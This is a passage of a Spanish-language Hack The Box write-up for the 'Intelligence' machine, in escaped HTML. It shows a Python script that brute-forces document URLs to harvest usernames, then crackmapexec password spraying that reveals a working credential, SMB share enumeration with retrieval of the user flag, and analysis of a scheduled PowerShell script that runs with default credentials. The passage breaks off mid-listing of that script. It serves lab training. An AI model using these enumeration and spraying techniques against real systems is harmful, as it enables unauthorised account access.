&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; a in range&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2020, 2022&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
    print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;Init: {a}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; b in range&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0,13&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; c in range&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0,32&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:         
            &lt;span class=&#34;nv&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://intelligence.htb/documents/{a}-{zero(b)}-{zero(c)}-upload.pdf&amp;#34;&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; requests.get&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; r.status_code !&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 404:
                wget.download&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;              
    print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;Finish: {a}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;


&lt;span class=&#34;c1&#34;&gt;# All files ending with .pdf to users.txt&lt;/span&gt;
with open&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;users.txt&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; as the_file:
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; i in get_usernames&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;glob.glob&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;os.getcwd&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;+&lt;span class=&#34;s2&#34;&gt;&amp;#34;/*.pdf&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;:
        the_file.write&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;{i}\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al finalizar la ejecucion encontramos 30 &amp;ldquo;nombres y apellidos&amp;rdquo;, utilizamos &lt;code&gt;sort&lt;/code&gt; y &lt;code&gt;uniq&lt;/code&gt; para eliminar los duplicados.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;π ~/htb/intelligence/docs ❯ ./enum_docs.py
Init: &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
100% &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;..............................................................................&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;25109&lt;/span&gt; / 25109Finish: &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
Init: &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
100% &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;..............................................................................&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;12127&lt;/span&gt; / 12127Finish: &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
 π ~/htb/intelligence/docs ❯ cat users.txt&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;sort&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;uniq&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;wc -l
&lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;
 π ~/htb/intelligence/docs ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;tiffany---user&#34;&gt;Tiffany - User&lt;/h1&gt;
&lt;h2 id=&#34;password-spraying&#34;&gt;Password Spraying&lt;/h2&gt;
&lt;p&gt;Utilizamos la contraseña junto con el wordlist de usuarios para realizar &lt;a href=&#34;https://mpgn.gitbook.io/crackmapexec/smb-protocol/password-spraying&#34;&gt;Password Spraying&lt;/a&gt;. Logramos encontrar una combinacion de usuario:contraseña aceptada en Samba y Ldap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/intelligence/docs ❯ crackmapexec smb intelligence.htb -u usersV2.txt -p NewIntelligenceCorpUser9876&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep +
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; intelligence.htb&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina:NewIntelligenceCorpUser9876
 π ~/htb/intelligence/docs ❯ crackmapexec ldap intelligence.htb -u usersV2.txt -p NewIntelligenceCorpUser9876&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep +
LDAP        10.10.10.248    &lt;span class=&#34;m&#34;&gt;389&lt;/span&gt;    DC               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; intelligence.htb&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina:NewIntelligenceCorpUser9876
 π ~/htb/intelligence/docs ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;smb&#34;&gt;SMB&lt;/h2&gt;
&lt;p&gt;Tras enumerar los recursos en SAMBA vemos que sobresaltan &lt;code&gt;Users&lt;/code&gt; y &lt;code&gt;IT&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/intelligence ❯ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H intelligence.htb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; IP: intelligence.htb:445    Name: unknown
    Disk                                                    Permissions Comment
    ----                                                    ----------- -------
    ADMIN$                                              NO ACCESS   Remote Admin
    C$                                                  NO ACCESS   Default share
    IPC$                                                READ ONLY   Remote IPC
    IT                                                  READ ONLY   
    NETLOGON                                            READ ONLY   Logon server share
    SYSVOL                                              READ ONLY   Logon server share
    Users                                               READ ONLY   
 π ~/htb/intelligence ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ingresamos al recurso &lt;code&gt;Users&lt;/code&gt; donde encontramos la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/intelligence ❯ smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;intelligence.htb&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Users -U Tiffany.Molina &lt;span class=&#34;c1&#34;&gt;# NewIntelligenceCorpUser9876&lt;/span&gt;
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password:
Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                  DR        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 21:20:26 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  ..                                 DR        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 21:20:26 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  Administrator                       D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:18:39 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  All Users                       DHSrn        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sat Sep &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; 03:21:46 &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt;
  Default                           DHR        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 22:17:40 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  Default User                    DHSrn        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sat Sep &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; 03:21:46 &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt;
  desktop.ini                       AHS      &lt;span class=&#34;m&#34;&gt;174&lt;/span&gt;  Sat Sep &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; 03:11:27 &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt;
  Public                             DR        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:18:39 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  Ted.Graves                          D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 21:20:26 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  Tiffany.Molina                      D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:51:46 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;

        &lt;span class=&#34;m&#34;&gt;3770367&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;1460874&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Tiffany.Molina&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;smb: &lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Desktop&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;smb: &lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                  DR        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:51:46 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  ..                                 DR        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:51:46 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  user.txt                           AR       &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt;  Sun Jul &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 02:15:29 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;

        &lt;span class=&#34;m&#34;&gt;3770367&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;1460874&lt;/span&gt; blocks available

smb: &lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get user.txt
getting file &lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;ser.txt of size &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt; as user.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.1 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 0.1 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
smb: &lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
 π ~/htb/intelligence ❯ cat user.txt
075fbb0ca2160f9734fe17358c73b628
 π ~/htb/intelligence ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;ted---user&#34;&gt;Ted - User&lt;/h1&gt;
&lt;p&gt;En el recurso &lt;code&gt;IT&lt;/code&gt; encontramos un script de powershell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/intelligence ❯ smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;intelligence.htb&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;IT -U Tiffany.Molina &lt;span class=&#34;c1&#34;&gt;# NewIntelligenceCorpUser9876&lt;/span&gt;
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password:
Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:50:55 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:50:55 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  downdetector.ps1                    A     &lt;span class=&#34;m&#34;&gt;1046&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:50:55 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;

        &lt;span class=&#34;m&#34;&gt;3770367&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;1460874&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get downdetector.ps1
getting file &lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;owndetector.ps1 of size &lt;span class=&#34;m&#34;&gt;1046&lt;/span&gt; as downdetector.ps1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;3.5 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 3.5 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
 π ~/htb/intelligence ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Segun su contenido se ejecuta cada 5 minutos, realiza una busqueda de objetos con el nombre que contenga &lt;code&gt;web*&lt;/code&gt; dentro del AD es decir una URL que luego utiliza para realizar una solicitud, y, que segun la &lt;a href=&#34;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1&#34;&gt;Documentacion&lt;/a&gt; utiliza las credenciales del usuario que realiza esta solicitud, para finalmente verificar el estado, si es una respuesta no igual a &lt;a href=&#34;https://developer.mozilla.org/es/docs/Web/HTTP/Status/200&#34;&gt;&lt;strong&gt;200&lt;/strong&gt;&lt;/a&gt; envia un Correo electronico utilizando el cmdlet &lt;a href=&#34;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/send-mailmessage?view=powershell-7.1#example-1--send-an-email-from-one-person-to-another-person&#34;&gt;Send-MailMessage&lt;/a&gt; al usuario Ted indicando que la URL (u objeto) está caido.&lt;/p&gt;
&lt;p&gt;Al filtrar los objetos &lt;code&gt;web*&lt;/code&gt; esta realizando una busqueda de &lt;a href=&#34;https://mcselles.wordpress.com/2016/03/17/how-to-find-and-add-dns-record-permissions-with-powershell/&#34;&gt;registros de dominios&lt;/a&gt;, además esta haciendo uso del modulo &lt;a href=&#34;https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2019-ps&#34;&gt;ActiveDirectory&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;c&#34;&gt;# Check web server status. Scheduled to run every 5min&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ActiveDirectory&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$record&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-ChildItem&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Where-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-like&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;web*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-WebRequest&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Uri&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;$(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$record&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-UseDefaultCredentials&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;StatusCode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-ne&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
